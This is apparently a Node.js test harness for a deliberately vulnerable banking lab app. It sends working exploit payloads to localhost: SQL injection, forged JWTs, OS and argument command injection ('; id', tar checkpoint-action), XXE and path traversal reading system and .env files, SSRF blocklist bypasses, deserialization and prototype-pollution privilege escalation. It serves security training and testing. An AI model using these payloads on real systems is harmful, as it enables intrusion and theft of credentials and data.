#!/usr/bin/env node
/*
 * Meridian Trust — full vulnerability regression / API test harness.
 * Exercises every automatable planted vulnerability over HTTP (+ WebSocket)
 * and asserts it fires. Genuinely manual / client-side / DoS checks are listed
 * as SKIP with a reason so coverage is fully accounted for.
 *
 * Usage:  BASE=http://127.0.0.1:3001 node scripts/test_vulns.js
 * Tip:    run `npm run reseed` + restart first for a clean, repeatable run.
 */
const crypto = require('crypto');
const http = require('http');
const fs = require('fs');
const path = require('path');
const BASE = process.env.BASE || 'http://127.0.0.1:3001';
const PORT = BASE.split(':')[2] || '3001';
const C = { g: '\x1b[32m', r: '\x1b[31m', y: '\x1b[33m', d: '\x1b[2m', c: '\x1b[36m', x: '\x1b[0m' };
const uniq = () => 'u' + Date.now() + Math.floor(Math.random() * 1000);

// ---- HTTP helper with cookie jar + header capture ------------------------
const HDRS = ['content-type', 'content-disposition', 'location', 'access-control-allow-origin',
  'x-frame-options', 'content-security-policy', 'cache-control', 'x-content-type-options', 'x-powered-by'];
function jar() { return {}; }
function cookieHeader(j) { return Object.entries(j).map(([k, v]) => `${k}=${v}`).join('; '); }
function setCookies(res) { return typeof res.headers.getSetCookie === 'function' ? res.headers.getSetCookie() : []; }
function absorb(j, res) { for (const line of setCookies(res)) { const [kv] = line.split(';'); const i = kv.indexOf('='); j[kv.slice(0, i)] = kv.slice(i + 1); } }
async function req(method, p, opts = {}) {
  const h = { ...(opts.headers || {}) };
  if (opts.jar && Object.keys(opts.jar).length) h['Cookie'] = cookieHeader(opts.jar);
  let body = opts.body;
  if (opts.form) { body = opts.form; }
  else if (body && typeof body === 'object') {
    if ((h['Content-Type'] || '').includes('json')) body = JSON.stringify(body);
    else { h['Content-Type'] = 'application/x-www-form-urlencoded'; body = new URLSearchParams(body).toString(); }
  }
  const res = await fetch(BASE + p, { method, headers: h, body, redirect: 'manual' });
  if (opts.jar) absorb(opts.jar, res);
  const hdr = {}; for (const k of HDRS) hdr[k] = res.headers.get(k);
  return { status: res.status, text: await res.text(), hdr, cookies: setCookies(res) };
}
// Raw http request (lets us set headers fetch forbids, e.g. Host).
function rawReq(method, p, headers = {}, body) {
  return new Promise((resolve, reject) => {
    const u = new URL(BASE + p);
    const r = http.request({ hostname: u.hostname, port: u.port, path: u.pathname + u.search, method, headers }, res => {
      let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, text: d }));
    });
    r.on('error', reject); if (body) r.write(body); r.end();
  });
}
async function login(user, pass) { const j = jar(); await req('POST', '/login', { jar: j, body: { username: user, password: pass } }); return j; }
async function admin() { return login("admin' --", 'x'); } // via SQLi

// JWT forgers
const b64u = b => Buffer.from(b).toString('base64url');
const jwtNone = pl => `${b64u(JSON.stringify({ alg: 'none', typ: 'JWT' }))}.${b64u(JSON.stringify(pl))}.`;
function jwtHS(pl, secret, header) {
  const h = b64u(JSON.stringify(header || { alg: 'HS256', typ: 'JWT' })); const p = b64u(JSON.stringify(pl));
  return `${h}.${p}.${crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url')}`;
}
function upload(p, filename, bytes, type, j) {
  const fd = new FormData(); fd.append('avatar', new Blob([bytes], { type }), filename);
  return fetch(BASE + p, { method: 'POST', headers: j && Object.keys(j).length ? { Cookie: cookieHeader(j) } : {}, body: fd, redirect: 'manual' })
    .then(async r => ({ status: r.status, text: await r.text() }));
}
function wsSteal() {
  return new Promise(res => {
    let WS; try { WS = require('ws'); } catch { return res(false); }
    const ws = new WS(BASE.replace(/^http/, 'ws') + '/ws', { origin: 'http://evil.example' });
    let done = false; const fin = v => { if (!done) { done = true; try { ws.close(); } catch {} res(v); } };
    ws.on('open', () => ws.send(JSON.stringify({ cmd: 'getUser', id: 1 })));
    ws.on('message', m => { if (/password/.test(m.toString())) fin(true); });
    ws.on('error', () => fin(false)); setTimeout(() => fin(false), 3000);
  });
}

// ---- registry ------------------------------------------------------------
const tests = [];
const T = (id, cat, name, fn) => tests.push({ id, cat, name, fn });
const S = (id, cat, name, reason) => tests.push({ id, cat, name, skip: reason });

// ===================== A01 — Broken Access Control =====================
T('VB-021', 'A01 Access Control', 'SQLi login bypass', async () => { const r = await req('POST', '/login', { jar: jar(), body: { username: "admin' --", password: 'x' } }); return r.status === 302 && /dashboard/.test(r.hdr.location || ''); });
T('VB-001', 'A01 Access Control', 'IDOR view treasury account', async () => { const j = await login('bob', 'hunter2'); const r = await req('GET', '/account/1', { jar: j }); return /ACCT-1000/.test(r.text) && /treasury/.test(r.text); });
T('VB-002', 'A01 Access Control', 'IDOR any transaction', async () => { const j = await login('bob', 'hunter2'); const r = await req('GET', '/transaction/1', { jar: j }); return /from_acct/.test(r.text); });
T('VB-003', 'A01 Access Control', 'IDOR view any profile (SSN)', async () => { const j = await login('bob', 'hunter2'); const r = await req('GET', '/profile/1', { jar: j }); return /111-11-1111/.test(r.text); });
T('VB-005', 'A01 Access Control', 'Admin panel, no role check', async () => { const r = await req('GET', '/admin'); return /Administration Console/.test(r.text) && /4111111111111111/.test(r.text); });
T('VB-006', 'A01 Access Control', 'Forced browsing via robots.txt', async () => { const r = await req('GET', '/robots.txt'); return /Disallow: \/admin/.test(r.text); });
T('VB-007', 'A01 Access Control', 'Mass assignment role at register', async () => { const u = uniq(); await req('POST', '/register', { jar: jar(), body: { username: u, password: 'p', email: 'e@e.com', role: 'admin' } }); const r = await req('GET', '/api/v1/users'); return new RegExp(`"username":"${u}","password":"p","email":"e@e.com","role":"admin"`).test(r.text); });
T('VB-008', 'A01 Access Control', 'Transfer from foreign account', async () => { const j = await login('bob', 'hunter2'); const r = await req('POST', '/transfer', { jar: j, body: { fromAcct: 1, toAcct: 4, amount: 1, memo: 'x' } }); return /Transferred/.test(r.text); });
T('VB-009', 'A01 Access Control', 'Path traversal reads .env', async () => { const j = await admin(); const r = await req('GET', '/download?file=../.env', { jar: j }); return /JWT_SECRET/.test(r.text); });
T('VB-012', 'A01 Access Control', 'CORS reflects origin + creds', async () => { const r = await req('GET', '/', { headers: { Origin: 'https://evil.example' } }); return r.hdr['access-control-allow-origin'] === 'https://evil.example'; });
T('VB-101', 'A01 Access Control', 'Trusts X-User-Id header', async () => { const r = await req('GET', '/dashboard', { headers: { 'X-User-Id': '1' } }); return /Alice Admin/.test(r.text); });
T('VB-154', 'A01 Access Control', 'CSRF via GET money movement', async () => { const j = await login('bob', 'hunter2'); const r = await req('GET', '/quick-transfer?to=1&amount=1', { jar: j }); return /transferred/.test(r.text); });
T('VB-156', 'A01 Access Control', 'Open redirect', async () => { const r = await req('GET', '/redirect?url=https://evil.example'); return (r.hdr.location || '').startsWith('https://evil.example'); });
T('VB-158', 'A01 Access Control', 'Host header injection in reset link', async () => { const r = await rawReq('POST', '/reset', { Host: 'evil.example', 'Content-Type': 'application/x-www-form-urlencoded' }, 'username=admin'); return /evil\.example\/reset\/confirm/.test(r.text); });
T('VB-214', 'A01 Access Control', 'Forgeable remember-me cookie', async () => { const r = await req('GET', '/dashboard', { headers: { Cookie: 'remember=' + Buffer.from('admin').toString('base64') } }); return /Total relationship balance/.test(r.text); });

// ===================== API (OWASP API Top 10) =====================
T('VB-011', 'API Security', 'Unauth /api/v1/users leaks secrets', async () => { const r = await req('GET', '/api/v1/users'); return /"password":"admin"/.test(r.text); });
T('VB-180', 'API Security', 'JWT issued by /api/login', async () => { const r = await req('POST', '/api/login', { headers: { 'Content-Type': 'application/json' }, body: { username: 'admin', password: 'admin' } }); return /"token":"ey/.test(r.text); });
T('VB-014', 'API Security', 'JWT alg:none forges admin', async () => { const r = await req('GET', '/api/users', { headers: { Authorization: 'Bearer ' + jwtNone({ sub: 1, role: 'admin' }) } }); return /"ssn"/.test(r.text); });
T('VB-059', 'API Security', 'JWT weak secret (secret123) verifies', async () => { const r = await req('GET', '/api/users', { headers: { Authorization: 'Bearer ' + jwtHS({ sub: 1, role: 'admin' }, 'secret123') } }); return /"card_number"/.test(r.text); });
T('VB-182', 'API Security', 'Excessive data exposure /api/users', async () => { const r = await req('GET', '/api/users', { headers: { Authorization: 'Bearer ' + jwtNone({ sub: 1 }) } }); return /"password"/.test(r.text) && /"ssn"/.test(r.text); });
T('VB-179', 'API Security', 'BOLA: any account by id', async () => { const r = await req('GET', '/api/accounts/1', { headers: { Authorization: 'Bearer ' + jwtNone({ sub: 999 }) } }); return /ACCT-1000/.test(r.text); });
T('VB-184', 'API Security', 'BFLA: setrole without admin', async () => { const r = await req('POST', '/api/admin/setrole', { headers: { Authorization: 'Bearer ' + jwtNone({ sub: 3 }), 'Content-Type': 'application/json' }, body: { userId: 3, role: 'admin' } }); return /"ok":true/.test(r.text); });
T('VB-208', 'API Security', 'No-auth PUT mass assignment', async () => { const r = await req('PUT', '/user/4', { headers: { 'Content-Type': 'application/json' }, body: { role: 'auditor' } }); return /"role":"auditor"/.test(r.text); });
T('VB-209', 'API Security', 'IDOR by account number', async () => { const r = await req('GET', '/api/acct?num=ACCT-1000'); return /treasury/.test(r.text); });
T('VB-188', 'API Security', 'Improper inventory: /api/v1 unauth', async () => { const r = await req('GET', '/api/v1/users'); return r.status === 200 && /card_number/.test(r.text); });
T('VB-175', 'API Security', 'GraphQL BOLA leaks password', async () => { const r = await req('POST', '/graphql', { headers: { 'Content-Type': 'application/json' }, body: { query: '{ account(id:1){ owner{ password } } }' } }); return /"password":"admin"/.test(r.text); });
T('VB-206', 'API Security', 'GraphQL mutation setRole (no authz)', async () => { const r = await req('POST', '/graphql', { headers: { 'Content-Type': 'application/json' }, body: { query: 'mutation{ setRole(userId:5, role:"admin"){role} }' } }); return /"role":"admin"/.test(r.text); });
T('VB-207', 'API Security', 'GraphQL transfer mutation (no authz)', async () => { const r = await req('POST', '/graphql', { headers: { 'Content-Type': 'application/json' }, body: { query: 'mutation{ transfer(from:1,to:4,amount:1){balance} }' } }); return /"balance"/.test(r.text); });
T('VB-176', 'API Security', 'GraphQL alias batching', async () => { const r = await req('POST', '/graphql', { headers: { 'Content-Type': 'application/json' }, body: { query: '{ a:user(id:1){role} b:user(id:2){role} }' } }); return /"a":/.test(r.text) && /"b":/.test(r.text); });

// ===================== A03 — Injection =====================
T('VB-022', 'A03 Injection', 'UNION SQLi in search', async () => { const j = await admin(); const r = await req('GET', "/search?q=' UNION SELECT 1,2,3,4,'UNIONMARK',6-- ", { jar: j }); return /UNIONMARK/.test(r.text); });
T('VB-023', 'A03 Injection', 'Boolean-blind SQLi', async () => { const a = await req('GET', '/blind?id=1 AND 1=1'); const b = await req('GET', '/blind?id=1 AND 1=2'); return /User exists/.test(a.text) && /User not found/.test(b.text); });
T('VB-025', 'A03 Injection', 'Second-order SQLi', async () => { const j = await admin(); await req('POST', '/so/set-nick', { jar: j, body: { nick: "x' UNION SELECT 1,'SONMARK'-- " } }); const r = await req('GET', '/so/lookup', { jar: j }); return /SONMARK/.test(r.text); });
T('VB-026', 'A03 Injection', 'Header-based SQLi', async () => { const r = await req('GET', '/track', { headers: { 'User-Agent': "x' UNION SELECT password FROM users WHERE username='admin'-- " } }); return /admin/.test(r.text); });
T('VB-028', 'A03 Injection', 'ORDER BY SQLi (arbitrary expr)', async () => { const r = await req('GET', '/sortusers?order=' + encodeURIComponent('CASE WHEN 1=1 THEN 1 ELSE 2 END')); return r.status === 200 && /"username"/.test(r.text); });
T('VB-029', 'A03 Injection', 'Stacked-query SQLi escalates', async () => { await req('GET', "/note?data=" + encodeURIComponent("x'); UPDATE users SET role='admin' WHERE username='carol'; --")); const r = await req('GET', '/api/v1/users'); return /"username":"carol","password":"letmein","email":"carol@example.com","role":"admin"/.test(r.text); });
T('VB-030', 'A03 Injection', 'Stored XSS (transfer memo)', async () => { const j = await admin(); await req('POST', '/transfer', { jar: j, body: { fromAcct: 2, toAcct: 4, amount: 1, memo: '<script>STOREDXSS</script>' } }); const r = await req('GET', '/account/4', { jar: j }); return /<script>STOREDXSS<\/script>/.test(r.text); });
T('VB-031', 'A03 Injection', 'Reflected XSS in search', async () => { const j = await admin(); const r = await req('GET', '/search?q=<script>REFLXSS</script>', { jar: j }); return /<script>REFLXSS<\/script>/.test(r.text); });
T('VB-034', 'A03 Injection', 'Reflected XSS in 404', async () => { const r = await req('GET', '/x<script>R404</script>'); return r.status === 404 && /<script>R404<\/script>/.test(r.text); });
T('VB-035', 'A03 Injection', 'Referer-reflected XSS', async () => { const r = await req('GET', '/welcome', { headers: { Referer: '<script>REFXSS</script>' } }); return /<script>REFXSS<\/script>/.test(r.text); });
T('VB-038', 'A03 Injection', 'JSON served as text/html', async () => { const r = await req('GET', '/api-echo?q=x'); return /text\/html/.test(r.hdr['content-type'] || ''); });
T('VB-039', 'A03 Injection', 'Markdown XSS (raw HTML)', async () => { const j = await admin(); await req('POST', '/support', { jar: j, body: { subject: 't', body: '<u>MDXSS</u>' } }); const list = await req('GET', '/support', { jar: j }); const id = (list.text.match(/\/message\/(\d+)/) || [])[1]; const r = await req('GET', '/message/' + id, { jar: j }); return /<u>MDXSS<\/u>/.test(r.text); });
T('VB-040', 'A03 Injection', 'OS command injection', async () => { const j = await admin(); const r = await req('POST', '/admin/ping', { jar: j, body: { host: '127.0.0.1; id' } }); return /uid=\d+/.test(r.text); });
T('VB-042', 'A03 Injection', 'Argument injection (tar)', async () => { const r = await req('GET', '/archive?path=' + encodeURIComponent('--checkpoint=1 --checkpoint-action=exec=id .')); return /uid=\d+/.test(r.text); });
T('VB-043', 'A03 Injection', 'SSTI evaluates template', async () => { const j = await admin(); await req('POST', '/profile/1', { jar: j, body: { display_name: '<%= 7*7 %>' } }); const r = await req('GET', '/greet', { jar: j }); return /49/.test(r.text); });
T('VB-044', 'A03 Injection', 'NoSQL/object injection', async () => { const r = await req('POST', '/nosql-login', { headers: { 'Content-Type': 'application/json' }, body: { username: 'admin', password: { $ne: 'x' } } }); return /"ok":true/.test(r.text); });
T('VB-045', 'A03 Injection', 'CRLF value reflected', async () => { const r = await req('GET', '/setlang?lang=<script>CRLF</script>'); return /<script>CRLF<\/script>/.test(r.text); });
T('VB-046', 'A03 Injection', 'Log injection (forged line)', async () => { await req('GET', '/track-event?name=hi%0aFORGEDLINE'); const r = await req('GET', '/logs'); return /FORGEDLINE/.test(r.text); });
T('VB-047', 'A03 Injection', 'XPath injection bypass', async () => { const r = await req('GET', '/xpath?user=' + encodeURIComponent("' or '1'='1")); return (JSON.parse(r.text).matched || []).length >= 2; });
T('VB-048', 'A03 Injection', 'LDAP wildcard injection', async () => { const r = await req('GET', '/ldap?user=*'); return (JSON.parse(r.text).matched || []).length >= 3; });
T('VB-049', 'A03 Injection', 'SSI injection exec', async () => { const r = await req('GET', '/ssi?tpl=' + encodeURIComponent('x<!--#exec cmd="id"-->')); return /uid=\d+/.test(r.text); });
T('VB-050', 'A03 Injection', 'SMTP header injection', async () => { const r = await req('GET', '/contact?subject=hi%0aBcc:victim@x.com'); return /Bcc:victim@x.com/.test(r.text); });
T('VB-161', 'A03 Injection', 'XXE file read', async () => { const j = await admin(); const r = await req('POST', '/import/xml', { jar: j, headers: { 'Content-Type': 'application/xml' }, body: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>' }); return /Parsed XML/.test(r.text) && !/&x;/.test(r.text.split('result')[1] || ''); });
T('VB-213', 'A03 Injection', 'Billion-laughs amplification', async () => { const r = await req('POST', '/import/xml2', { headers: { 'Content-Type': 'application/xml' }, body: '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "AAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><r>&c;</r>' }); return JSON.parse(r.text).expanded_bytes >= 1000; });
T('VB-211', 'A03 Injection', 'Stored XSS via username', async () => { await req('POST', '/register', { jar: jar(), body: { username: '<script>UXSS</script>', password: 'p', email: 'e@e.com' } }); const r = await req('GET', '/admin/recent'); return /<script>UXSS<\/script>/.test(r.text); });

// ===================== A02 — Cryptographic Failures =====================
T('VB-055', 'A02 Crypto', 'Plaintext password storage', async () => { const r = await req('GET', '/api/v1/users'); return /"username":"admin","password":"admin"/.test(r.text); });
T('VB-058', 'A02 Crypto', 'Sensitive data exposure (PAN/SSN)', async () => { const r = await req('GET', '/api/v1/users'); return /111-11-1111/.test(r.text) && /4111111111111111/.test(r.text); });
T('VB-060', 'A02 Crypto', 'JWT kid injection (empty key)', async () => { const r = await req('GET', '/jwt/kid/whoami', { headers: { Authorization: 'Bearer ' + jwtHS({ sub: 1, role: 'admin' }, '', { alg: 'HS256', kid: '/dev/null' }) } }); return /"role":"admin"/.test(r.text); });
T('VB-062', 'A02 Crypto', 'JWT algorithm confusion', async () => { const forged = JSON.parse((await req('GET', '/jwt/forge-demo')).text).forged_token; const r = await req('GET', '/jwt/rs256/whoami', { headers: { Authorization: 'Bearer ' + forged } }); return /"role":"admin"/.test(r.text); });
T('VB-063', 'A02 Crypto', 'Session cookie missing HttpOnly', async () => { const r = await req('GET', '/'); const sc = r.cookies.find(c => /connect\.sid/.test(c)) || ''; return sc && !/httponly/i.test(sc); });
T('VB-065', 'A02 Crypto', 'Predictable reset token', async () => { const r = await req('POST', '/reset', { body: { username: 'admin' } }); return r.text.includes(Buffer.from('1:admin').toString('base64')); });
T('VB-068', 'A02 Crypto', 'AES-ECB block repetition', async () => { const r = await req('GET', '/crypto/ecb?text=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'); const b = JSON.parse(r.text).blocks; return b[0] === b[1]; });
T('VB-071', 'A02 Crypto', 'Length-extendable MAC issuer', async () => { const r = await req('GET', '/crypto/sign?data=amount=10'); return /"mac":"[a-f0-9]{32}"/.test(r.text); });
T('VB-072', 'A02 Crypto', 'Reversible token forgery', async () => { const r = await req('GET', '/crypto/whoami?token=' + Buffer.from('bob:admin').toString('base64')); return /"admin":true/.test(r.text); });

// ===================== A04 — Insecure Design =====================
T('VB-075', 'A04 Insecure Design', 'Negative-amount transfer', async () => { const j = await admin(); const r = await req('POST', '/transfer', { jar: j, body: { fromAcct: 2, toAcct: 4, amount: -500, memo: 'x' } }); return /Transferred -500/.test(r.text); });
T('VB-080', 'A04 Insecure Design', 'Currency rounding abuse', async () => { const j = await admin(); const r = await req('GET', '/fx?amount=0.4', { jar: j }); const d = JSON.parse(r.text); return d.debited === 0 && d.converted > 0; });
T('VB-085', 'A04 Insecure Design', 'Client-trusted price', async () => { const j = await admin(); const r = await req('POST', '/shop/buy', { jar: j, headers: { 'Content-Type': 'application/json' }, body: { item: 'Gold', price: 0 } }); return /"charged":0/.test(r.text); });
T('VB-086', 'A04 Insecure Design', 'Voucher enumeration oracle', async () => { const r = await req('GET', '/voucher?code=GIFT-0042'); return /"valid":true/.test(r.text); });
T('VB-104', 'A04 Insecure Design', 'Password change w/o current', async () => { const j = await login('bob', 'hunter2'); const r = await req('POST', '/account/password', { jar: j, body: { new: 'x' } }); return /"ok":true/.test(r.text); });
T('VB-172', 'A04 Insecure Design', 'HTTP Parameter Pollution', async () => { const j = await admin(); const r = await req('GET', '/pay?amount=1&amount=1000000', { jar: j }); return /"actually_charged":1000000/.test(r.text); });

// ===================== A07 — Auth Failures =====================
T('VB-087', 'A07 Auth', 'No lockout / brute force', async () => { for (let i = 0; i < 6; i++) await req('POST', '/login', { jar: jar(), body: { username: 'admin', password: 'wrong' + i } }); const r = await req('POST', '/login', { jar: jar(), body: { username: 'admin', password: 'admin' } }); return r.status === 302; });
T('VB-090', 'A07 Auth', 'Weak password policy', async () => { const r = await req('POST', '/register', { jar: jar(), body: { username: uniq(), password: '1', email: 'e@e.com' } }); return r.status === 302; });
T('VB-091', 'A07 Auth', 'Username enumeration (messages)', async () => { const a = await req('POST', '/login', { jar: jar(), body: { username: 'admin', password: 'nope' } }); const b = await req('POST', '/login', { jar: jar(), body: { username: 'ghost404', password: 'nope' } }); return /Wrong password/.test(a.text) && /No such user/.test(b.text); });
T('VB-092', 'A07 Auth', 'Timing-based user enumeration', async () => { const t0 = Date.now(); await req('GET', '/user-check?u=admin'); const t1 = Date.now(); await req('GET', '/user-check?u=zzz404'); const t2 = Date.now(); return (t1 - t0) - (t2 - t1) > 150; });
T('VB-098', 'A07 Auth', 'OTP leaked to client', async () => { const r = await req('GET', '/otp/mfa/send', { jar: jar() }); return /"debug_otp"/.test(r.text); });
T('VB-100', 'A07 Auth', 'OTP reusable', async () => { const j = jar(); const otp = JSON.parse((await req('GET', '/otp/mfa/send', { jar: j })).text).debug_otp; const a = await req('POST', '/otp/mfa/verify', { jar: j, body: { code: otp } }); const b = await req('POST', '/otp/mfa/verify', { jar: j, body: { code: otp } }); return /"ok":true/.test(a.text) && /"ok":true/.test(b.text); });
T('VB-102', 'A07 Auth', 'OAuth state not validated', async () => { const r = await req('GET', '/oauth/callback?code=AUTHCODE-1'); return /logged_in_as/.test(r.text); });
T('VB-103', 'A07 Auth', 'OAuth open redirect_uri', async () => { const r = await req('GET', '/oauth/authorize?redirect_uri=https://evil.example&state=abc'); return (r.hdr.location || '').startsWith('https://evil.example'); });

// ===================== A05 — Security Misconfiguration =====================
T('VB-105', 'A05 Misconfig', 'Verbose SQL error leaked', async () => { const r = await req('POST', '/login', { jar: jar(), body: { username: "'", password: 'x' } }); return /SQL error/.test(r.text); });
T('VB-106', 'A05 Misconfig', 'Debug endpoint dumps env', async () => { const r = await req('GET', '/debug'); return /cwd:/.test(r.text) && /"PATH"/.test(r.text); });
T('VB-107', 'A05 Misconfig', 'Default credentials admin/admin', async () => { const r = await req('POST', '/login', { jar: jar(), body: { username: 'admin', password: 'admin' } }); return r.status === 302; });
T('VB-108', 'A05 Misconfig', 'Directory listing on /backup', async () => { const r = await req('GET', '/backup'); return /Index of/.test(r.text); });
T('VB-109', 'A05 Misconfig', 'Missing security headers', async () => { const r = await req('GET', '/'); return !r.hdr['content-security-policy'] && !r.hdr['x-frame-options']; });
T('VB-113', 'A05 Misconfig', 'Version banner disclosed', async () => { const r = await req('GET', '/'); return /MeridianTrust/.test(r.hdr['x-powered-by'] || ''); });
T('VB-114', 'A05 Misconfig', 'Unrestricted upload -> stored XSS', async () => { const j = await admin(); const fn = 'poc' + Date.now() + '.svg'; await upload('/upload', fn, '<svg xmlns="http://www.w3.org/2000/svg"><script>SVGXSS</script></svg>', 'image/svg+xml', j); const r = await req('GET', '/uploads/' + fn); try { fs.unlinkSync(path.join(__dirname, '..', 'uploads', fn)); } catch {} return /SVGXSS/.test(r.text); });
T('VB-159', 'A05 Misconfig', 'Cache poisoning (unkeyed header)', async () => { const r = await req('GET', '/home-banner', { headers: { 'X-Forwarded-Host': 'evil.example' } }); return /evil\.example/.test(r.text) && /public/.test(r.hdr['cache-control'] || ''); });
T('VB-160', 'A05 Misconfig', 'Cache deception (.css path)', async () => { const r = await req('GET', '/account-info/x.css'); return /public/.test(r.hdr['cache-control'] || ''); });
T('VB-165', 'A05 Misconfig', 'Missing X-Content-Type-Options', async () => { const r = await req('GET', '/raw?body=x'); return !r.hdr['x-content-type-options']; });
T('VB-198', 'A05 Misconfig', 'EXIF metadata not stripped', async () => { const j = await admin(); const fn = 'exif' + Date.now() + '.jpg'; await upload('/upload', fn, Buffer.from('\xff\xd8\xff\xe1\x00\x10Exif\x00\x00gps', 'binary'), 'image/jpeg', j); const r = await req('GET', '/exif?file=' + fn); try { fs.unlinkSync(path.join(__dirname, '..', 'uploads', fn)); } catch {} return /"exif_present":true/.test(r.text); });
T('VB-210', 'A05 Misconfig', 'Reflected File Download', async () => { const r = await req('GET', '/statement/export?name=Meridian.bat'); return /filename="Meridian\.bat"/.test(r.hdr['content-disposition'] || ''); });

// ===================== A06 — Vulnerable Components =====================
T('VB-122', 'A06 Components', 'Outdated lodash disclosed', async () => { const r = await req('GET', '/version'); return /"lodash":"4\.17\.11"/.test(r.text); });
T('VB-123', 'A06 Components', 'Outdated marked disclosed', async () => { const r = await req('GET', '/version'); return /"marked":"0\.3\.6"/.test(r.text); });

// ===================== A08 — Integrity Failures =====================
T('VB-130', 'A08 Integrity', 'Insecure deserialization RCE', async () => { const poc = (await req('GET', '/integrity/prefs/poc')).text.trim().split('\n').pop(); await req('GET', '/integrity/prefs/load?prefs=' + encodeURIComponent(poc)); const hit = fs.existsSync('/tmp/vulnbank_deser_pwned'); if (hit) try { fs.unlinkSync('/tmp/vulnbank_deser_pwned'); } catch {} return hit; });
T('VB-135', 'A08 Integrity', 'CSV/formula injection in export', async () => { const j = await admin(); await req('POST', '/transfer', { jar: j, body: { fromAcct: 2, toAcct: 4, amount: 1, memo: '=cmd|calc' } }); const r = await req('GET', '/integrity/export.csv'); return /=cmd\|calc/.test(r.text); });
T('VB-136', 'A08 Integrity', 'Unverified webhook signature', async () => { const r = await req('POST', '/integrity/webhook/receive', { headers: { 'Content-Type': 'application/json' }, body: { event: 'deposit', amount: 1, acct: 2 } }); return /"accepted":true/.test(r.text); });

// ===================== A10 — SSRF =====================
T('VB-138', 'A10 SSRF', 'Avatar-by-URL SSRF', async () => { const j = await admin(); const r = await req('GET', '/avatar/fetch?url=' + encodeURIComponent(BASE + '/version'), { jar: j }); return /MeridianTrust/.test(r.text); });
T('VB-140', 'A10 SSRF', 'Webhook tester SSRF', async () => { const r = await req('POST', '/webhook', { headers: { 'Content-Type': 'application/json' }, body: { url: BASE + '/version' } }); return /MeridianTrust/.test(r.text); });
T('VB-069', 'A10 SSRF', 'Blocklist bypass (0.0.0.0)', async () => { const r = await req('GET', '/proxy?url=' + encodeURIComponent('http://0.0.0.0:' + PORT + '/version')); return /MeridianTrust/.test(r.text); });
T('VB-145', 'A10 SSRF', 'file:// scheme read', async () => { const r = await req('GET', '/proxy?url=' + encodeURIComponent('file:///etc/hostname')); return r.text.trim().length > 0 && !/blocked/.test(r.text); });

// ===================== A09 / DoS =====================
T('VB-194', 'A09/DoS', 'Expensive query (no pagination)', async () => { const r = await req('GET', '/report?n=3'); return /rows_scanned/.test(r.text); });

// ===================== Client-side / WebSocket =====================
T('VB-173', 'Client-side', 'Cross-site WebSocket hijack', async () => wsSteal());

// ===================== Prototype pollution (runs last — pollutes proc) ====
T('VB-212', 'A06 Components', 'Prototype pollution -> privesc', async () => { const j = await admin(); const before = JSON.parse((await req('GET', '/feature/flags')).text); await req('POST', '/profile/1', { jar: j, headers: { 'Content-Type': 'application/json' }, body: '{"__proto__":{"isAdmin":true,"premium":true}}' }); const after = JSON.parse((await req('GET', '/feature/flags')).text); return before.isAdmin === false && after.isAdmin === true; });

// ---- SKIP (manual / client-side / DoS — verify by hand, see FINDINGS) ----
S('VB-024', 'A03 Injection', 'Time-based blind SQLi', 'timing/sqlmap — would slow the run');
S('VB-053', 'A03 Injection', 'ReDoS', 'hangs the single-thread server ~60s');
S('VB-077', 'A04 Insecure Design', 'Race condition / double-spend', 'non-deterministic — use Turbo Intruder');
S('VB-193', 'A05 Misconfig', 'Unbounded request body', 'resource exhaustion — verify by hand');
S('VB-196', 'A08 Integrity', 'Zip Slip', 'needs a crafted archive (adm-zip normalizes on write)');
S('VB-032', 'Client-side', 'DOM-based XSS', 'browser DOM sink');
S('VB-036', 'Client-side', 'Blind XSS', 'executes in an admin browser');
S('VB-155', 'Client-side', 'JSON CSRF', 'requires a victim browser');
S('VB-157', 'Client-side', 'Reverse tabnabbing', 'browser window.opener');
S('VB-166', 'Client-side', 'postMessage no origin check', 'browser messaging');
S('VB-167', 'Client-side', 'DOM clobbering', 'browser DOM');
S('VB-169', 'Client-side', 'Secrets in localStorage', 'browser storage');
S('VB-174', 'Client-side', 'WS message injection', 'covered structurally by VB-173');
S('VB-177', 'API Security', 'GraphQL nested-query DoS', 'depth-based DoS — verify by hand');

// ---- runner --------------------------------------------------------------
(async () => {
  console.log(`\n  ${C.c}Meridian Trust — full vulnerability test harness${C.x}`);
  console.log(`  Target: ${BASE}\n`);
  let pass = 0, fail = 0, skip = 0, lastCat = '';
  for (const t of tests) {
    if (t.cat !== lastCat) { console.log(`\n${C.d}  ── ${t.cat} ──${C.x}`); lastCat = t.cat; }
    if (t.skip) { skip++; console.log(`    ${C.y}~ SKIP${C.x} ${t.id}  ${t.name} ${C.d}(${t.skip})${C.x}`); continue; }
    let ok = false, err = '';
    try { ok = await t.fn(); } catch (e) { err = e.message; }
    if (ok) { pass++; console.log(`    ${C.g}✓ PASS${C.x} ${t.id}  ${t.name}`); }
    else { fail++; console.log(`    ${C.r}✗ FAIL${C.x} ${t.id}  ${t.name}${err ? C.d + ' — ' + err + C.x : ''}`); }
  }
  const auto = pass + fail;
  console.log(`\n  ${pass === auto ? C.g : C.y}${pass}/${auto} automated passed${C.x}, ${fail} failed, ${skip} manual/skipped.`);
  console.log(`  ${C.d}Reseed + restart before a clean run (some tests mutate data & pollute the process).${C.x}\n`);
  process.exit(fail ? 1 : 0);
})();
